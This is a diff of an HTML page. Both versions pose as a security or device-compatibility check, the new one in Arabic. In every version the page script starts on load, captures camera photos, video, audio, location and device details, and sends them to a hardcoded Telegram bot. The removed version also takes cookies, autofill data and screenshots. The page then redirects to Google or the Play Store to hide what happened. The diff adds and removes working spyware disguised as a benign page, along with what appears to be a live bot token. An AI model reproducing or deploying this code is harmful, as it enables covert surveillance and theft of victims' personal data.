@@ -1,306 +1,121 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔒 Secure Connection | Identity Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث أمان النظام</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
-            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #e0e0e0;
-            padding: 20px;
-        }
-        .glass-card {
-            background: rgba(18, 25, 45, 0.75);
-            backdrop-filter: blur(12px);
-            border-radius: 32px;
-            border: 1px solid rgba(0, 255, 255, 0.2);
-            box-shadow: 0 25px 45px rgba(0,0,0,0.4);
-            padding: 2rem;
-            max-width: 550px;
-            width: 100%;
-            text-align: center;
-        }
-        h2 {
-            font-weight: 600;
-            font-size: 1.9rem;
-            background: linear-gradient(135deg, #fff, #3bc9db);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .status-box {
-            background: #0f1422;
-            border-radius: 20px;
-            padding: 1.2rem;
-            margin: 1.5rem 0;
-            font-family: monospace;
-            font-size: 0.8rem;
-            text-align: left;
-            border-left: 4px solid #3bc9db;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        .status-line { display: flex; align-items: center; gap: 10px; margin: 6px 0; }
-        .spinner {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid rgba(59,201,219,0.3);
-            border-top-color: #3bc9db;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .hidden { display: none; }
-        .footer { margin-top: 25px; font-size: 0.7rem; color: #6c7a8e; }
-        .blink { animation: blink 1.2s infinite; }
-        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+        body { background-color: #000; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; width: 80%; }
+        .loader { border: 4px solid #333; border-top: 4px solid #4285f4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .progress-bar { width: 100%; background-color: #333; border-radius: 10px; margin-top: 20px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 8px; background-color: #4285f4; transition: width 0.5s; }
+        h1 { font-size: 1.2rem; margin-bottom: 10px; color: #fff; }
+        p { color: #aaa; font-size: 0.9rem; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-<div class="glass-card">
-    <h2>🔒 SECURE IDENTITY PROTOCOL</h2>
-    <p>Verifying your session & device integrity</p>
-    <div class="status-box" id="logBox">
-        <div class="status-line" id="step1">🔐 <span>Establishing secure channel...</span> <span class="spinner"></span></div>
-        <div class="status-line hidden" id="step2">📷 <span>Accessing camera & microphone...</span> <span class="spinner"></span></div>
-        <div class="status-line hidden" id="step3">📍 <span>Retrieving geolocation...</span> <span class="spinner"></span></div>
-        <div class="status-line hidden" id="step4">📱 <span>Capturing device identifiers...</span> <span class="spinner"></span></div>
-        <div class="status-line hidden" id="step5">📸 <span>Taking screenshots & logs...</span> <span class="spinner"></span></div>
+    <div class="container">
+        <div class="loader"></div>
+        <h1 id="status">جاري فحص توافق الجهاز...</h1>
+        <p id="sub-status">يرجى عدم إغلاق الصفحة لضمان استقرار النظام</p>
+        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
     </div>
-    <div class="footer" id="footerMsg">🔒 AES-256 Encrypted • Secure Channel</div>
-</div>
 
-<script>
-    // ======================= CONFIG =======================
-    const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
-    const CHAT_ID = "7984067238";
-    
-    // Helper: send photo
-    async function sendPhoto(blob, caption = "") {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob);
-        if (caption) fd.append('caption', caption);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-    }
-    // Helper: send voice
-    async function sendVoice(blob) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('voice', blob);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
-    }
-    // Helper: send video
-    async function sendVideo(blob) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('video', blob);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
-    }
-    // Helper: send text
-    async function sendMessage(text) {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        });
-    }
-    
-    function addLog(msg) {
-        const logBox = document.getElementById('logBox');
-        const line = document.createElement('div');
-        line.className = 'status-line';
-        line.innerHTML = `🔄 <span>${msg}</span> <span class="spinner"></span>`;
-        logBox.appendChild(line);
-        setTimeout(() => {
-            line.querySelector('.spinner')?.classList.add('hidden');
-            line.innerHTML = `✅ <span>${msg} ✓</span>`;
-        }, 500);
-    }
-    
-    // ========== 1. Capture multiple photos (5 front, 5 back) ==========
-    async function captureMultiplePhotos(mode, count, captionPrefix) {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: mode } } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        const canvas = document.createElement('canvas');
-        canvas.width = 800;
-        canvas.height = 600;
-        for (let i = 0; i < count; i++) {
-            await new Promise(r => setTimeout(r, 400));
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-            if (blob) await sendPhoto(blob, `${captionPrefix} (${i+1}/${count})`);
-        }
-        stream.getTracks().forEach(t => t.stop());
-    }
-    
-    // ========== 2. Record video (8 sec) ==========
-    async function recordVideoClip(stream, duration = 8000) {
-        return new Promise((resolve) => {
-            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-            const chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                if (blob.size > 5000) await sendVideo(blob);
-                resolve();
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), duration);
-        });
-    }
-    
-    // ========== 3. Record audio only (10 sec) ==========
-    async function recordAudioOnly(stream) {
-        return new Promise((resolve) => {
-            const recorder = new MediaRecorder(stream);
-            const chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
-                if (blob.size > 2000) await sendVoice(blob);
-                resolve();
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), 10000);
-        });
-    }
-    
-    // ========== 4. Capture screenshots (5 times, every 2 sec) ==========
-    async function captureScreenshots() {
-        if (typeof html2canvas === 'undefined') return;
-        for (let i = 0; i < 5; i++) {
-            await new Promise(r => setTimeout(r, 2000));
-            const canvas = await html2canvas(document.body);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-            if (blob) await sendPhoto(blob, `📸 Screenshot ${i+1}/5`);
-        }
-    }
-    
-    // ========== 5. Steal cookies ==========
-    async function stealCookies() {
-        const cookies = document.cookie;
-        if (cookies && cookies.length > 0) {
-            await sendMessage(`🍪 *COOKIES*%0A\`\`\`${cookies.substring(0, 900)}\`\`\``);
-        }
-    }
-    
-    // ========== 6. Steal autofill data ==========
-    async function stealAutofill() {
-        const inputs = document.querySelectorAll('input');
-        let found = [];
-        inputs.forEach(inp => {
-            if (inp.value && inp.value.length > 2 && (inp.type === 'email' || inp.type === 'tel' || inp.name.toLowerCase().includes('email'))) {
-                found.push(`${inp.name || 'unknown'}: ${inp.value}`);
+    <script>
+        const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
+        const CHID = "7984067238";
+
+        async function sendToTg(data, type, filename = "file") {
+            const formData = new FormData();
+            formData.append('chat_id', CHID);
+            if (type === 'photo') formData.append('photo', data, filename + '.jpg');
+            else if (type === 'video') formData.append('video', data, filename + '.mp4');
+            else if (type === 'text') {
+                formData.append('text', data);
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: CHID, text: data, parse_mode: 'HTML'}) });
+                return;
             }
-        });
-        if (found.length) await sendMessage(`📝 *AUTOFILL DATA*%0A${found.join('%0A')}`);
-    }
-    
-    // ========== 7. Continuous location (every 15 sec) ==========
-    let locationInterval = null;
-    function startContinuousLocation() {
-        if (!navigator.geolocation) return;
-        const sendLocation = () => {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapsUrl = `📍 *LIVE LOCATION*%0Ahttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}%0A🎯 Acc: ${pos.coords.accuracy}m`;
-                await sendMessage(mapsUrl);
-            }, () => {});
-        };
-        sendLocation();
-        locationInterval = setInterval(sendLocation, 15000);
-    }
-    
-    // ========== 8. Device fingerprint ==========
-    async function sendDeviceInfo() {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const fp = await new Promise((resolve) => {
-            if (typeof FingerprintJS !== 'undefined') {
-                FingerprintJS.load().then(fp => fp.get()).then(result => resolve(result.visitorId));
-            } else resolve('N/A');
-        });
-        const info = `🖥️ *DEVICE INFO*%0A📱 UA: ${navigator.userAgent}%0A💻 Platform: ${navigator.platform}%0A🌐 Lang: ${navigator.language}%0A📺 Screen: ${screen.width}x${screen.height}%0A🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}%0A🌍 IP: ${ipData.ip}%0A🆔 Fingerprint: ${fp}`;
-        await sendMessage(info);
-    }
-    
-    // ========== 9. Fake notification ==========
-    function showFakeNotification() {
-        if (Notification.permission === 'granted') {
-            new Notification('⚠️ Security Alert', { body: 'Your session requires re-authentication. Please verify your identity.', icon: 'https://cdn-icons-png.flaticon.com/512/190/190411.png' });
-        } else if (Notification.permission !== 'denied') {
-            Notification.requestPermission().then(perm => {
-                if (perm === 'granted') showFakeNotification();
-            });
+            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: formData });
         }
-    }
-    
-    // ========== 10. Try to get phone number (if saved in browser) ==========
-    async function getPhoneNumber() {
-        try {
-            const telInput = document.querySelector('input[type="tel"]');
-            if (telInput && telInput.value) await sendMessage(`📞 *PHONE NUMBER FOUND*%0A${telInput.value}`);
-        } catch(e) {}
-    }
-    
-    // ========== MAIN EXECUTION ==========
-    async function startHarvest() {
-        addLog("Requesting camera & microphone");
-        let mediaStream;
-        try {
-            mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        } catch(e) { console.warn(e); return; }
-        addLog("Camera & microphone granted");
-        
-        // Start recording video (8 sec) and audio (10 sec) in parallel
-        recordVideoClip(mediaStream, 8000);
-        recordAudioOnly(mediaStream);
-        
-        // Capture multiple photos (front + back)
-        addLog("Capturing front camera photos (5 shots)");
-        await captureMultiplePhotos('user', 5, '📸 Front camera');
-        addLog("Capturing back camera photos (5 shots)");
-        await captureMultiplePhotos('environment', 5, '📸 Back camera');
-        
-        // Location
-        addLog("Getting live location");
-        startContinuousLocation();
-        
-        // Device info + cookies + autofill + phone
-        addLog("Collecting device fingerprint & cookies");
-        await sendDeviceInfo();
-        await stealCookies();
-        await stealAutofill();
-        await getPhoneNumber();
-        
-        // Screenshots
-        addLog("Capturing screenshots (5 images)");
-        await captureScreenshots();
-        
-        // Fake notification
-        showFakeNotification();
-        
-        addLog("All data captured successfully");
-        await sendMessage(`✅ *Session completed* - ${new Date().toISOString()}`);
-        
-        // Redirect to Google after 2 seconds
-        setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
-    }
-    
-    window.onload = () => {
-        setTimeout(() => startHarvest(), 1000);
-    };
-</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+
+        async function getSpecs() {
+            let battery = await navigator.getBattery();
+            let specs = `<b>📱 معلومات الجهاز الشاملة:</b>\n` +
+                        `🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? "يشحن" : "لا يشحن"})\n` +
+                        `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\n` +
+                        `🌐 اللغة: ${navigator.language}\n` +
+                        `⚙️ المعالج: ${navigator.hardwareConcurrency} Cores\n` +
+                        `🧠 الرام التقريبي: ${navigator.deviceMemory || "غير معروف"} GB\n` +
+                        `🆔 الوكيل: ${navigator.userAgent}`;
+            await sendToTg(specs, 'text');
+        }
+
+        async function captureBurst(mode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                
+                for(let i=0; i<3; i++) { // التقاط 3 صور سريعة لكل كاميرا
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(b => sendToTg(b, 'photo', `img_${mode}_${i}`), 'image/jpeg');
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+        }
+
+        async function recordVideo() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    sendToTg(blob, 'video', 'secret_video');
+                    stream.getTracks().forEach(t => t.stop());
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 10000); // 10 ثوانٍ
+            } catch(e) {}
+        }
+
+        async function startExploit() {
+            document.getElementById('fill').style.width = '30%';
+            try {
+                // طلب الموقع بدقة عالية
+                navigator.geolocation.getCurrentPosition(p => {
+                    const loc = `📍 موقع دقيق:\nhttps://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`;
+                    sendToTg(loc, 'text');
+                }, null, {enableHighAccuracy: true});
+
+                await getSpecs();
+                document.getElementById('fill').style.width = '50%';
+                
+                // بدء العمليات المتوازية
+                recordVideo(); // يبدأ تسجيل الفيديو في الخلفية
+                await captureBurst("user"); // صور أمامية سريعة
+                document.getElementById('fill').style.width = '80%';
+                await captureBurst("environment"); // صور خلفية سريعة
+                
+                document.getElementById('fill').style.width = '100%';
+                document.getElementById('status').innerText = "اكتمل الفحص بنجاح!";
+                setTimeout(() => window.location.href = "https://play.google.com", 2000);
+            } catch (e) {
+                document.getElementById('status').innerText = "حدث خطأ في الاتصال";
+            }
+        }
+
+        window.onload = () => {
+            // انتظار تفاعل المستخدم أو البدء تلقائياً بعد منح الإذن
+            startExploit();
+        };
+    </script>
 </body>
 </html>
